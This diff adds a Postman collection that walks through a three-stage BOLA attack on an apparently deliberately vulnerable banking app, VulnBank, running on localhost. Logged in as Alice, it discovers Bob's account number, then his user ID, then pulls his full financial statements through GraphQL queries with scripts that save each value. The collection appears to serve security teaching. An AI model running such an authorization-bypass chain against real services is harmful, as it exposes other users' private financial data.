@@ -1,0 +1,220 @@
+{
+  "info": {
+    "name": "VulnBank BOLA Demo",
+    "description": "Multi-stage Horizontal BOLA (Broken Object Level Authorization) attack demonstration.\n\nAttack Flow:\n1. Login as Alice\n2. Stage 1: Discover Bob's account number from transactions\n3. Stage 2: Lookup Bob's profile using account number\n4. Stage 3: Access Bob's full financial statements\n\nThis demonstrates how an attacker can chain multiple BOLA vulnerabilities to access another user's sensitive data.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://localhost:5000"
+    },
+    {
+      "key": "token",
+      "value": ""
+    }
+  ],
+  "item": [
+    {
+      "name": "Step 0 - Login as Alice",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              "var jsonData = pm.response.json();",
+              "if (jsonData.data && jsonData.data.login && jsonData.data.login.token) {",
+              "    pm.collectionVariables.set('token', jsonData.data.login.token);",
+              "    console.log('Token saved to collection variable');",
+              "}",
+              "",
+              "pm.test('Login successful', function() {",
+              "    pm.expect(jsonData.data.login.status).to.eql('success');",
+              "});"
+            ],
+            "type": "text/javascript"
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "graphql",
+          "graphql": {
+            "query": "mutation {\n  login(username: \"alice\", password: \"password\") {\n    status\n    token\n    accountNumber\n    isAdmin\n    debugInfo\n  }\n}"
+          }
+        },
+        "url": {
+          "raw": "{{baseUrl}}/graphql",
+          "host": ["{{baseUrl}}"],
+          "path": ["graphql"]
+        },
+        "description": "Login as Alice to get a valid JWT token.\n\nThe token will be automatically saved to the collection variable for use in subsequent requests."
+      }
+    },
+    {
+      "name": "Stage 1 - Account Discovery",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              "var jsonData = pm.response.json();",
+              "",
+              "pm.test('Transactions returned', function() {",
+              "    pm.expect(jsonData.data.recentTransactions).to.be.an('array');",
+              "});",
+              "",
+              "// Look for Bob's account number",
+              "var transactions = jsonData.data.recentTransactions;",
+              "var bobAccount = null;",
+              "transactions.forEach(function(tx) {",
+              "    if (tx.fromAccount === '6955215471' || tx.toAccount === '6955215471') {",
+              "        bobAccount = '6955215471';",
+              "    }",
+              "});",
+              "",
+              "if (bobAccount) {",
+              "    console.log('DISCOVERED: Bob account number = ' + bobAccount);",
+              "    pm.collectionVariables.set('bobAccountNumber', bobAccount);",
+              "}"
+            ],
+            "type": "text/javascript"
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          },
+          {
+            "key": "Authorization",
+            "value": "Bearer {{token}}"
+          }
+        ],
+        "body": {
+          "mode": "graphql",
+          "graphql": {
+            "query": "{\n  recentTransactions {\n    fromAccount\n    toAccount\n    amount\n    description\n    timestamp\n    transactionType\n  }\n}"
+          }
+        },
+        "url": {
+          "raw": "{{baseUrl}}/graphql",
+          "host": ["{{baseUrl}}"],
+          "path": ["graphql"]
+        },
+        "description": "**BOLA Stage 1: Account Discovery**\n\nView Alice's recent transactions. The vulnerability here is that transaction data exposes counterparty account numbers.\n\n**What to look for:**\n- `fromAccount` or `toAccount` containing `6955215471` (Bob's account)\n\n**Vulnerability:** Information leakage through transaction data"
+      }
+    },
+    {
+      "name": "Stage 2 - User Enumeration",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              "var jsonData = pm.response.json();",
+              "",
+              "pm.test('Profile returned', function() {",
+              "    pm.expect(jsonData.data.accountProfile).to.not.be.null;",
+              "});",
+              "",
+              "if (jsonData.data.accountProfile) {",
+              "    var userId = jsonData.data.accountProfile.userId;",
+              "    var username = jsonData.data.accountProfile.username;",
+              "    console.log('DISCOVERED: userId = ' + userId + ', username = ' + username);",
+              "    pm.collectionVariables.set('bobUserId', userId);",
+              "}"
+            ],
+            "type": "text/javascript"
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          },
+          {
+            "key": "Authorization",
+            "value": "Bearer {{token}}"
+          }
+        ],
+        "body": {
+          "mode": "graphql",
+          "graphql": {
+            "query": "{\n  accountProfile(accountNumber: \"6955215471\") {\n    userId\n    username\n    accountNumber\n    profilePicture\n    accountCreated\n    accountType\n  }\n}"
+          }
+        },
+        "url": {
+          "raw": "{{baseUrl}}/graphql",
+          "host": ["{{baseUrl}}"],
+          "path": ["graphql"]
+        },
+        "description": "**BOLA Stage 2: User Enumeration**\n\nUsing Bob's account number discovered in Stage 1, look up his profile.\n\n**What to look for:**\n- `userId: 3` - This enables Stage 3\n- `username: \"bob\"` - PII disclosure\n\n**Vulnerability:** No ownership verification - any authenticated user can look up any account's profile"
+      }
+    },
+    {
+      "name": "Stage 3 - Full Data Access",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              "var jsonData = pm.response.json();",
+              "",
+              "pm.test('Statements returned', function() {",
+              "    pm.expect(jsonData.data.accountStatements).to.be.an('array');",
+              "});",
+              "",
+              "if (jsonData.data.accountStatements.length > 0) {",
+              "    console.log('SUCCESS: Full horizontal BOLA achieved!');",
+              "    console.log('Accessed ' + jsonData.data.accountStatements.length + ' statements');",
+              "    jsonData.data.accountStatements.forEach(function(stmt) {",
+              "        console.log('Month: ' + stmt.month + ', Balance: ' + stmt.closingBalance + ', Notes: ' + stmt.notes);",
+              "    });",
+              "}"
+            ],
+            "type": "text/javascript"
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          },
+          {
+            "key": "Authorization",
+            "value": "Bearer {{token}}"
+          }
+        ],
+        "body": {
+          "mode": "graphql",
+          "graphql": {
+            "query": "{\n  accountStatements(userId: 3) {\n    id\n    month\n    openingBalance\n    closingBalance\n    totalCredits\n    totalDebits\n    notes\n    transactions {\n      date\n      description\n      amount\n      balanceAfter\n      transactionType\n    }\n  }\n}"
+          }
+        },
+        "url": {
+          "raw": "{{baseUrl}}/graphql",
+          "host": ["{{baseUrl}}"],
+          "path": ["graphql"]
+        },
+        "description": "**BOLA Stage 3: Full Data Access**\n\nUsing Bob's userId discovered in Stage 2, access his complete financial statements.\n\n**What you get:**\n- Complete transaction history\n- Monthly balances\n- Sensitive notes (e.g., \"Consulting fee - Bob Smith LLC\")\n\n**Vulnerability:** No authorization check - any authenticated user can view any user's complete financial history\n\n**Impact:** Full horizontal privilege escalation achieved!"
+      }
+    }
+  ]
+}
